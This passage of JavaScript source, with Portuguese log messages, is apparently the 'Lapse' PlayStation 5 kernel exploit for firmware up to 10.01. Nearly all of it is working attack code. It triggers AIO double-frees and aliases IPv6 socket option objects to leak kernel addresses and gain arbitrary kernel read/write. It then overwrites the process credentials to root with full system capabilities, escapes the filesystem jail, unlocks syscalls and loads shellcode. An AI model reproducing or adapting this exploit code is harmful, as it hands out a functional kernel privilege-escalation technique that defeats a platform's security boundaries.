                    if (val === expected_flag) {
                        evfs.splice(idx - 1, 1);
                    } else {
                        evf = null;
                    }
                }

                for (let k = 0; k < evfs.length; k++) {
                    if (evf === null || evfs[k] !== evf) {
                        free_evf(evfs[k]);
                    }
                }

                if (evf !== null) {
                    await log("rthdr e evf confundidos na tentativa: " + i);
                    break;
                }
            }

            if (evf === null) {
                await log("Falha ao confundir evf e rthdr");
                return null;
            }

            set_evf_flags(evf, 0xff00n);

            const kernel_addr = read64(buf + 0x28n);
            await log("Endereço da string \"evf cv\": " + toHex(kernel_addr));

            const kbuf_addr = read64(buf + 0x40n) - 0x38n;
            await log("Endereço do buffer do kernel: " + toHex(kbuf_addr));

            const wbufsz = 0x80;
            const wbuf = malloc(wbufsz);
            const rsize = build_rthdr(wbuf, wbufsz);
            const marker_val = 0xdeadbeefn;
            const reqs3_offset = 0x10n;

            write32(wbuf + 4n, marker_val);
            write32(wbuf + reqs3_offset + 0n, 1n);   // .ar3_num_reqs
            write32(wbuf + reqs3_offset + 4n, 0n);   // .ar3_reqs_left
            write32(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE); // .ar3_state
            write8(wbuf + reqs3_offset + 0xcn, 0n);  // .ar3_done
            write32(wbuf + reqs3_offset + 0x28n, 0x67b0000n); // .ar3_lock.lock_object.lo_flags
            write64(wbuf + reqs3_offset + 0x38n, 1n); // .ar3_lock.lk_lock = LK_UNLOCKED

            const num_elems = 6;

            const ucred = kbuf_addr + 4n;
            const leak_reqs = make_reqs1(num_elems);
            write64(leak_reqs + 0x10n, ucred);

            const num_loop = NUM_SDS;
            const leak_ids_len = num_loop * num_elems;
            const leak_ids = malloc(4 * leak_ids_len);
            const step = BigInt(4 * num_elems);
            const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

            let reqs2_off = null;
            let fake_reqs3_off = null;
            let fake_reqs3_sd = null;

            for (let i = 1; i <= NUM_LEAKS; i++) {
                for (let j = 1; j <= num_loop; j++) {
                    write32(wbuf + 8n, BigInt(j));
                    aio_submit_cmd(cmd, leak_reqs, num_elems, 3n, leak_ids + (BigInt(j - 1) * step));
                    set_rthdr(Number(sds[j - 1]), wbuf, rsize);
                }
                
                get_rthdr(sd, buf, buflen);

                let sd_idx = null;
                reqs2_off = null;
                fake_reqs3_off = null;

                for (let off = 0x80; off < buflen; off += 0x80) {
                    const offset = BigInt(off);

                    if (reqs2_off === null && verify_reqs2(buf + offset, AIO_CMD_WRITE)) {
                        reqs2_off = off;
                    }

                    if (fake_reqs3_off === null) {
                        const marker = read32(buf + offset + 4n);
                        if (marker === marker_val) {
                            fake_reqs3_off = off;
                            sd_idx = Number(read32(buf + offset + 8n));
                        }
                    }
                }

                if (reqs2_off !== null && fake_reqs3_off !== null) {
                    await log("reqs2 e fake reqs3 encontrados na tentativa: " + i);
                    fake_reqs3_sd = sds[sd_idx - 1];
                    sds.splice(sd_idx - 1, 1);
                    free_rthdrs(sds);
                    sds.push(new_socket());
                    break;
                }

                free_aios(leak_ids, leak_ids_len);
            }

            if (reqs2_off === null || fake_reqs3_off === null) {
                await log("Não foi possível vazar reqs2 e fake reqs3");
                return null;
            }

            await log("reqs2 offset: " + toHex(BigInt(reqs2_off)));
            await log("fake reqs3 offset: " + toHex(BigInt(fake_reqs3_off)));

            get_rthdr(sd, buf, buflen);

            await log("aio_entry vazado:");

            let leak_str = "";
            for (let i = 0; i < 0x80; i += 8) {
                if (i % 16 === 0 && i !== 0) leak_str += "\n";
                leak_str += toHex(read64(buf + BigInt(reqs2_off + i))) + " ";
            }
            await log(leak_str);
            
            const aio_info_addr = read64(buf + BigInt(reqs2_off) + 0x18n);
            
            let reqs1_addr = read64(buf + BigInt(reqs2_off) + 0x10n);
            reqs1_addr = reqs1_addr & ~0xffn;

            const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

            await log("reqs1_addr = " + toHex(reqs1_addr));
            await log("fake_reqs3_addr = " + toHex(fake_reqs3_addr));

            await log("Procurando target_id...");

            let target_id = null;
            let to_cancel = null;
            let to_cancel_len = null;

            const errors = malloc(4 * num_elems);

            for (let i = 0; i < leak_ids_len; i += num_elems) {
                aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems, errors);
                get_rthdr(sd, buf, buflen);

                const state = read32(buf + BigInt(reqs2_off) + 0x38n);
                if (state === AIO_STATE_ABORTED) {
                    target_id = read32(leak_ids + BigInt(i * 4));
                    write32(leak_ids + BigInt(i * 4), 0n);

                    await log("target_id encontrado=" + toHex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));

                    const start = i + num_elems;
                    to_cancel = leak_ids + BigInt(start * 4);
                    to_cancel_len = leak_ids_len - start;

                    break;
                }
            }

            if (target_id === null) {
                await log("Target ID não encontrado");
                return null;
            }

            cancel_aios(to_cancel, to_cancel_len);
            free_aios2(leak_ids, leak_ids_len);

            await log("Endereços do kernel vazados com sucesso!");

            return {
                reqs1_addr: reqs1_addr,
                kbuf_addr: kbuf_addr,
                kernel_addr: kernel_addr,
                target_id: target_id,
                evf: evf,
                fake_reqs3_addr: fake_reqs3_addr,
                fake_reqs3_sd: fake_reqs3_sd,
                aio_info_addr: aio_info_addr
            };
        }

        function make_aliased_pktopts(sds) {
            const tclass = malloc(4);
            
            for (let loop = 0; loop < NUM_ALIAS; loop++) {
                for (let i = 0; i < sds.length; i++) {
                    write32(tclass, BigInt(i));
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                }
                
                for (let i = 0; i < sds.length; i++) {
                    get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = Number(read32(tclass));
                    
                    if (marker !== i) {
                        const sd_pair = [sds[i], sds[marker]];
                        log("pktopts aliasados na tentativa " + loop + " (par: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                        
                        if (marker > i) {
                            sds.splice(marker, 1);
                            sds.splice(i, 1);
                        } else {
                            sds.splice(i, 1);
                            sds.splice(marker, 1);
                        }
                        
                        for (let j = 0; j < 2; j++) {
                            const sock_fd = new_socket();
                            set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                            sds.push(sock_fd);
                        }
                        
                        return sd_pair;
                    }
                }
                
                for (let i = 0; i < sds.length; i++) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0);
                }
            }
            
            return null;
        }

        async function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
            const max_leak_len = (0xff + 1) << 3;
            const buf = malloc(max_leak_len);
            
            const num_elems = MAX_AIO_IDS;
            const aio_reqs = make_reqs1(num_elems);
            
            const num_batches = 2;
            const aio_ids_len = num_batches * num_elems;
            const aio_ids = malloc(4 * aio_ids_len);
            
            await log("Sobrescrevendo rthdr com entrada da fila AIO...");
            let aio_not_found = true;
            free_evf(evf);
            
            for (let i = 0; i < NUM_CLOBBERS; i++) {
                spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
                
                const size_ret = get_rthdr(sd, buf, max_leak_len);
                const cmd = read32(buf);
                
                if (size_ret === 8n && cmd === AIO_CMD_READ) {
                    await log("Aliasado na tentativa " + i);
                    aio_not_found = false;
                    cancel_aios(aio_ids, aio_ids_len);
                    break;
                }
                
                free_aios(aio_ids, aio_ids_len, true);
            }
            
            if (aio_not_found) {
                await log("Falha ao sobrescrever rthdr");
                return null;
            }
            
            const reqs2_size = 0x80;
            const reqs2 = malloc(reqs2_size);
            const rsize = build_rthdr(reqs2, reqs2_size);
            
            write32(reqs2 + 4n, 5n); // ar2_ticket
            write64(reqs2 + 0x18n, reqs1_addr); // ar2_info
            write64(reqs2 + 0x20n, fake_reqs3_addr); // ar2_batch
            
            const states = malloc(4 * num_elems);
            const addr_cache = [];
            for (let i = 0; i < num_batches; i++) {
                addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
            }
            
            await log("Sobrescrevendo entrada da fila AIO com rthdr...");
            
            syscall(SYSCALL.close, BigInt(sd));
            sd = null;
            
            async function overwrite_aio_entry_with_rthdr() {
                for (let i = 0; i < NUM_ALIAS; i++) {
                    for (let j = 0; j < sds.length; j++) {
                        set_rthdr(sds[j], reqs2, rsize);
                    }
                    
                    for (let batch = 0; batch < addr_cache.length; batch++) {
                        for (let j = 0; j < num_elems; j++) {
                            write32(states + BigInt(j * 4), -1n);
                        }
                        
                        aio_multi_cancel(addr_cache[batch], num_elems, states);
                        
                        let req_idx = -1;
                        for (let j = 0; j < num_elems; j++) {
                            const val = read32(states + BigInt(j * 4));
                            if (val === AIO_STATE_COMPLETE) {
                                req_idx = j;
                                break;
                            }
                        }
                        
                        if (req_idx !== -1) {
                            await log("req_id encontrado no batch " + batch + ", tentativa " + i);
                            
                            const aio_idx = batch * num_elems + req_idx;
                            const req_id_p = aio_ids + BigInt(aio_idx * 4);
                            const req_id = read32(req_id_p);
                            
                            aio_multi_poll(req_id_p, 1, states);
                            write32(req_id_p, 0n);
                            
                            return req_id;
                        }
                    }
                }
                
                return null;
            }
            
            const req_id = await overwrite_aio_entry_with_rthdr();
            if (req_id === null) {
                await log("Falha ao sobrescrever a entrada da fila AIO");
                return null;
            }
            
            free_aios2(aio_ids, aio_ids_len);
            
            const target_id_p = malloc(4);
            write32(target_id_p, BigInt(target_id));
            
            aio_multi_poll(target_id_p, 1, states);
            
            const sce_errs = malloc(8);
            write32(sce_errs, -1n);
            write32(sce_errs + 4n, -1n);
            
            const target_ids = malloc(8);
            write32(target_ids, req_id);
            write32(target_ids + 4n, BigInt(target_id));
            
            await log("Disparando double free...");
            aio_multi_delete(target_ids, 2, sce_errs);
            
            await log("Recuperando memória...");
            const sd_pair = make_aliased_pktopts(sds_alt);
            
            const err1 = read32(sce_errs);
            const err2 = read32(sce_errs + 4n);
            
            write32(states, -1n);
            write32(states + 4n, -1n);
            
            aio_multi_poll(target_ids, 2, states);
            
            let success = true;
            if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
                await log("ERRO: deleção inválida de requisição AIO corrompida");
                success = false;
            }
            
            if (err1 !== 0n || err1 !== err2) {
                await log("ERRO: deleção inválida do par de IDs");
                success = false;
            }
            
            if (!success) {
                await log("Double free falhou");
                return null;
            }
            
            if (sd_pair === null) {
                await log("Falha ao criar pktopts aliasados");
                return null;
            }
            
            return sd_pair;
        }

        async function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
            try {
                const master_sock = pktopts_sds[0];
                const tclass = malloc(4);
                const off_tclass = 0xc0n;  // offset do PS5
                
                const pktopts_size = 0x100;
                const pktopts = malloc(pktopts_size);
                const rsize = build_rthdr(pktopts, pktopts_size);
                const pktinfo_p = reqs1_addr + 0x10n;
                
                // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
                write64(pktopts + 0x10n, pktinfo_p);
                
                await log("Sobrescrevendo pktopts principal");
                let reclaim_sock = null;
                
                syscall(SYSCALL.close, pktopts_sds[1]);
                
                for (let i = 1; i <= NUM_ALIAS; i++) {
                    for (let j = 0; j < sds_alt.length; j++) {
                        write32(pktopts + off_tclass, 0x4141n | (BigInt(j) << 16n));
                        set_rthdr(sds_alt[j], pktopts, rsize);
                    }
                    
                    get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = read32(tclass);
                    if ((marker & 0xffffn) === 0x4141n) {
                        await log("Socket de recuperação encontrado na tentativa: " + i);
                        const idx = Number(marker >> 16n);
                        reclaim_sock = sds_alt[idx];
                        sds_alt.splice(idx, 1);
                        break;
                    }
                }
                
                if (reclaim_sock === null) {
                    await log("Falha ao sobrescrever pktopts principal");
                    return null;
                }
                
                const pktinfo_len = 0x14;
                const pktinfo = malloc(pktinfo_len);
                write64(pktinfo, pktinfo_p);
                
                const read_buf = malloc(8);
                
                function slow_kread8(addr) {
                    const len = 8;
                    let offset = 0;
                    
                    while (offset < len) {
                        // pktopts.ip6po_nhinfo = addr + offset
                        write64(pktinfo + 8n, addr + BigInt(offset));
                        
                        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);
                        
                        if (n === 0n) {
                            write8(read_buf + BigInt(offset), 0n);
                            offset = offset + 1;
                        } else {
                            offset = offset + Number(n);
                        }
                    }
                    
                    return read64(read_buf);
                }
                
                const test_read = slow_kread8(kernel_addr);
                await log("slow_kread8(\"evf cv\"): " + toHex(test_read));
                const kstr = read_null_terminated_string(read_buf);
                await log("*(\"evf cv\"): " + kstr);
                
                if (kstr !== "evf cv") {
                    await log("Leitura de teste de \"evf cv\" falhou");
                    return null;
                }
                
                await log("Leitura lenta arbitrária do kernel obtida");
                
                // Obtém curproc a partir do aio_info liberado anteriormente
                const curproc = slow_kread8(aio_info_addr + 8n);
                
                if (Number(curproc >> 48n) !== 0xffff) {
                    await log("Endereço de curproc do kernel inválido: " + toHex(curproc));
                    return null;
                }
                
                const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID);
                const current_pid = syscall(SYSCALL.getpid);
                
                if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
                    await log("verificação de curproc falhou: " + toHex(curproc));
                    return null;
                }
                
                await log("curproc = " + toHex(curproc));
                
                kernel.addr.curproc = curproc;
                kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD);
                kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES;
                kernel.addr.inside_kdata = kernel_addr;
                
                function get_fd_data_addr(sock, kread8_fn) {
                    const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES;
                    const file_addr = kread8_fn(filedescent_addr + 0x0n);
                    return kread8_fn(file_addr + 0x0n);
                }
                
                function get_sock_pktopts(sock, kread8_fn) {
                    const fd_data = get_fd_data_addr(sock, kread8_fn);
                    const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB);
                    const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS);
                    return pktopts;
                }
                
                const worker_sock = new_socket();
                const worker_pktinfo = malloc(pktinfo_len);
                
                // Cria pktopts no worker_sock
                set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
                
                const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
                
                write64(pktinfo, worker_pktopts + 0x10n);  // sobrepõe pktinfo
                write64(pktinfo + 8n, 0n);  // zera .ip6po_nexthop
                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                
                function kread20(addr, buf) {
                    write64(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kwrite20(addr, buf) {
                    write64(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kread8(addr) {
                    kread20(addr, worker_pktinfo);
                    return read64(worker_pktinfo);
                }
                
                // Nota: isto escreve nossos 8 bytes + os 12 bytes restantes como nulos
                function restricted_kwrite8(addr, val) {
                    write64(worker_pktinfo, val);
                    write64(worker_pktinfo + 8n, 0n);
                    write32(worker_pktinfo + 16n, 0n);
                    kwrite20(addr, worker_pktinfo);
                }
                
                write64(read_buf, kread8(kernel_addr));
                const kstr2 = read_null_terminated_string(read_buf);
                if (kstr2 !== "evf cv") {
                    await log("Leitura de teste de \"evf cv\" falhou");
                    return null;
                }
                
                await log("Leitura/escrita restrita do kernel obtida");
                
                // Inicializa ipv6_kernel_rw com escrita restrita
                ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
                
                kernel.read_buffer = ipv6_kernel_rw.read_buffer;
                kernel.write_buffer = ipv6_kernel_rw.write_buffer;
                kernel.copyout = ipv6_kernel_rw.copyout;
                kernel.copyin = ipv6_kernel_rw.copyin;
                
                const kstr3 = kernel.read_null_terminated_string(kernel_addr);
                if (kstr3 !== "evf cv") {
                    await log("Leitura de teste de \"evf cv\" falhou");
                    return null;
                }
                
                await log("Leitura/escrita arbitrária do kernel obtida!");
                
                // RESTAURAÇÃO: limpa ponteiros corrompidos
                const off_ip6po_rthdr = 0x70n;  // offset do PS5
                
                for (let i = 0; i < sds.length; i++) {
                    const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
                    kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0n);
                }
                
                const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);
                
                kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0n);
                kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0n);
                
                const sock_increase_ref = [
                    ipv6_kernel_rw.data.master_sock,
                    ipv6_kernel_rw.data.victim_sock,
                    master_sock,
                    worker_sock,
                    reclaim_sock
                ];
                
                // Aumenta as contagens de referência para evitar desalocação
                for (const each of sock_increase_ref) {
                    const sock_addr = get_fd_data_addr(each, kernel.read_qword);
                    kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
                }
                
                await log("Correções aplicadas");
                
                return true;
                
            } catch (e) {
                await log("erro em make_kernel_arw: " + e.message);
                await log(e.stack);
                return null;
            }
        }

        async function ps5_jailbreak() {
                        
            function find_allproc() {
                let proc = kernel.addr.curproc;
                while ((proc & 0xFFFFFFFF00000000n) !== 0xFFFFFFFF00000000n) {
                    proc = kernel.read_qword(proc + 0x8n);
                }
                return proc;
            }
            
            function pfind(pid) {
                let p = kernel.read_qword(allproc);
                while (p !== 0n) {
                    if (kernel.read_dword(p + kernel_offset.PROC_PID) === pid) {
                        return p;
                    }
                    p = kernel.read_qword(p);
                }
                throw new Error(`falha ao encontrar processo com pid ${pid}`);
            }
            
            function get_rootvnode() {
                const p = pfind(KERNEL_PID);
                const p_fd = kernel.read_qword(p + kernel_offset.PROC_FD);
                return kernel.read_qword(p_fd + ROOTVNODE_OFFSET);
            }

            function create_nonblock_pipe() {
                const [read_fd, write_fd] = create_pipe();
                syscall(SYSCALL.fcntl, read_fd,  F_SETFL, O_NONBLOCK);
                syscall(SYSCALL.fcntl, write_fd, F_SETFL, O_NONBLOCK);
                return [read_fd, write_fd];
            }

            function fget(fd) {
                const filedescent_addr = kernel.addr.curproc_ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
                return kernel.read_qword(filedescent_addr);
            }
            
            function fhold(fp) {
                const refcount = kernel.read_dword(fp + 0x28n);
                kernel.write_dword(fp + 0x28n, refcount + 1n);
            }

            function get_fdata(fd) {
                return kernel.read_qword(fget(fd) + 0x0n);
            }
            
            kernel.addr.allproc = find_allproc();
            const allproc = kernel.addr.allproc;
            const p = kernel.addr.curproc;
            const ucred = kernel.read_qword(p + OFFSET_P_UCRED); // p_ucred
            
            kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
            kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
            kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
            kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
            kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid
            kernel.write_dword(ucred + 0x18n, 0n); // cr_svgid

            // eleva os privilégios da Sony
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, SYSCORE_AUTHID); // cr_sceAuthID

            // habilita todas as capacidades do app
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
            kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]

            // define atributos do app
            kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
 
            // Permite acesso ao sistema de arquivos raiz.
            const rootvnode = get_rootvnode();        
            const p_fd = kernel.read_qword(p + 0x48n);
            
            kernel.write_qword(p_fd + 0x08n, rootvnode);  // fd_cdir
            kernel.write_qword(p_fd + 0x10n, rootvnode);  // fd_rdir
            kernel.write_qword(p_fd + 0x18n, 0n);         // fd_jdir
            
            // Permite syscall de qualquer lugar.
            const p_dynlib = kernel.read_qword(p + 0x3e8n);
            kernel.write_qword(p_dynlib + 0xf0n, 0n);                    // início
            kernel.write_qword(p_dynlib + 0xf8n, 0xFFFFFFFFFFFFFFFFn);   // fim
            
            // Permite dlsym.
            const dynlib_eboot = kernel.read_qword(p_dynlib + 0x00n);
            const eboot_segments = kernel.read_qword(dynlib_eboot + 0x40n);
            kernel.write_qword(eboot_segments + 0x08n, 0n);                   // endereço
            kernel.write_qword(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);  // tamanho
            
            const master_pipe = create_nonblock_pipe();
            const victim_pipe = create_nonblock_pipe();
            
            const master_rpipe_data = get_fdata(master_pipe[0]);
            const victim_rpipe_data = get_fdata(victim_pipe[0]);
            
            fhold(fget(master_pipe[0]));
            fhold(fget(master_pipe[1]));
            fhold(fget(victim_pipe[0]));
            fhold(fget(victim_pipe[1]));
            
            kernel.write_dword(master_rpipe_data + 0x00n, 0n);
            kernel.write_dword(master_rpipe_data + 0x04n, 0n);
            kernel.write_dword(master_rpipe_data + 0x08n, 0n);
            kernel.write_dword(master_rpipe_data + 0x0Cn, BigInt(PAGE_SIZE));
            kernel.write_qword(master_rpipe_data + 0x10n, victim_rpipe_data);
            
            await load_aioshellcode(allproc, master_pipe, victim_pipe);
            
        }
        
        async function cleanup() {
            await log("Executando limpeza...");

            try {
                if (block_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, block_fd);
                    block_fd = -1n;
                }
                if (unblock_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, unblock_fd);
                    unblock_fd = -1n;
                }

                if (groom_ids !== null) {
                    const groom_ids_addr = malloc(4 * NUM_GROOMS);
                    for (let i = 0; i < NUM_GROOMS; i++) {
                        write32(groom_ids_addr + BigInt(i * 4), BigInt(groom_ids[i]));
                    }
                    free_aios2(groom_ids_addr, NUM_GROOMS);
                    groom_ids = null;
                }

                if (block_id !== 0xffffffffffffffffn) {
                    const block_id_buf = malloc(4);
                    write32(block_id_buf, block_id);
                    const block_errors = malloc(4);
                    aio_multi_wait(block_id_buf, 1, block_errors, 1, 0n);
                    aio_multi_delete(block_id_buf, 1, block_errors);
                    block_id = -1n;
                }

                if (sds !== null) {
                    for (let i = 0; i < sds.length; i++) {
                        if (sds[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds[i]);
                            sds[i] = -1n;
                        }
                    }
                    sds = null;
                }

                if (sds_alt !== null) {
                    for (let i = 0; i < sds_alt.length; i++) {
                        if (sds_alt[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds_alt[i]);
                        }
                    }
                    sds_alt = null;
                }

                await log("Limpeza concluída");

            } catch (e) {
                await log("Erro durante a limpeza: " + e.message);
            }
        }
        
        ////////////////////
        // EXECUÇÃO PRINCIPAL //
        ////////////////////
        
        await log(lapse_version);
        send_notification(lapse_version);
        
        if(typeof load_aioshellcode === "undefined") {
            await log("Atualize o Y2JB para pelo menos a versão 1.5");
            send_notification("Atualize o Y2JB para pelo menos a versão 1.5");
            return;
        }
        
        if (compare_version(FW_VERSION, "10.01") > 0) {
            await log("Firmware não suportado " + FW_VERSION);
            send_notification("Firmware não suportado " + FW_VERSION);
            return;
        }
        
        if(is_jailbroken()) {
            await log("Já possui jailbreak");
            send_notification("Já possui jailbreak");
            return;
        }
        
        failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";

        if(file_exists(failcheck_path)) {
            await log("Reinicie seu PS5 para executar o Lapse novamente");
            send_notification("Reinicie seu PS5 para executar o Lapse novamente");
            return;
        }
        
        write_file(failcheck_path, "");
        
        if (typeof updateProgress === "function") updateProgress(10);
        await log("\n=== ESTÁGIO 0: Configuração ===");
        const setup_success = await setup();
        if (!setup_success) {
            await log("Falha na configuração");
            return;
        }
        
        await log("Configuração concluída");
            
        try {
            if (typeof updateProgress === "function") updateProgress(25);
            await log("\n=== ESTÁGIO 1: Double-free AIO ===");
            const sd_pair = await double_free_reqs2();
            if (sd_pair === null) {
                await log("Estágio 1: falha na condição de race");
                await cleanup();
                await log("Exploit falhou - reinicie e tente novamente");
                send_notification("Exploit falhou - reinicie e tente novamente");
                return;
            }
            await log("Estágio 1 concluído");
            
            if (typeof updateProgress === "function") updateProgress(40);
            await log("\n=== ESTÁGIO 2: Vazamento de endereços do kernel ===");
            const leak_result = await leak_kernel_addrs(sd_pair, sds);
            if (leak_result === null) {
                await log("Estágio 2: falha no vazamento de endereços do kernel");
                await cleanup();
                await log("Exploit falhou - reinicie e tente novamente");
                send_notification("Exploit falhou - reinicie e tente novamente");
                return;
            }
            await log("Estágio 2 concluído");
            
            await log("Endereços vazados:");
            await log("  reqs1_addr: " + toHex(leak_result.reqs1_addr));
            await log("  kbuf_addr: " + toHex(leak_result.kbuf_addr));
            await log("  kernel_addr: " + toHex(leak_result.kernel_addr));
            await log("  target_id: " + toHex(BigInt(leak_result.target_id)));
            await log("  fake_reqs3_addr: " + toHex(leak_result.fake_reqs3_addr));
            await log("  aio_info_addr: " + toHex(leak_result.aio_info_addr));
    
            if (typeof updateProgress === "function") updateProgress(55);
            await log("\n=== ESTÁGIO 3: Double free de SceKernelAioRWRequest ===");
            
            const pktopts_sds = await double_free_reqs1(
                leak_result.reqs1_addr,
                leak_result.target_id,
                leak_result.evf,
                sd_pair[0],
                sds,
                sds_alt,
                leak_result.fake_reqs3_addr
            );
            
            syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));
    
            if (pktopts_sds === null) {
                await log("Estágio 3: double free de SceKernelAioRWRequest falhou");
                await cleanup();
                await log("Exploit falhou - reinicie e tente novamente");
                send_notification("Exploit falhou - reinicie e tente novamente");
                return;
            }
            
            await log("Estágio 3 concluído!");
            await log("Par de sockets aliasado: " + pktopts_sds[0] + ", " + pktopts_sds[1]);

            if (typeof updateProgress === "function") updateProgress(70);
            await log("\n=== ESTÁGIO 4: Obter leitura/escrita arbitrária do kernel ===");
        
            const arw_result = await make_kernel_arw(
                pktopts_sds,
                leak_result.reqs1_addr,
                leak_result.kernel_addr,
                sds,
                sds_alt,
                leak_result.aio_info_addr
            );
            
            if (arw_result === null) {
                await log("Estágio 4: falha ao obter leitura/escrita arbitrária do kernel");
                await cleanup();
                await log("Exploit falhou - reinicie e tente novamente");
                send_notification("Exploit falhou - reinicie e tente novamente");
                return;
            }
            
            await log("Estágio 4 concluído!");
            
            if (typeof updateProgress === "function") updateProgress(85);
            await log("\n=== ESTÁGIO 5: Jailbreak do PS5 ===");
            
            await ps5_jailbreak();
            await log("Estágio 5 concluído!");
            
            await cleanup();
            
            if (typeof updateProgress === "function") updateProgress(100);
            await log("Lapse finalizado");
            send_notification("Lapse finalizado");
            
            kill_youtube();
            
        } catch (e) {
            await log("Erro no Lapse: " + e.message);
            await log(e.stack);
            
            await cleanup();
        }
        
    } catch (e) {
        await log("Erro no Lapse: " + e.message);
        await log(e.stack);
    }
})();
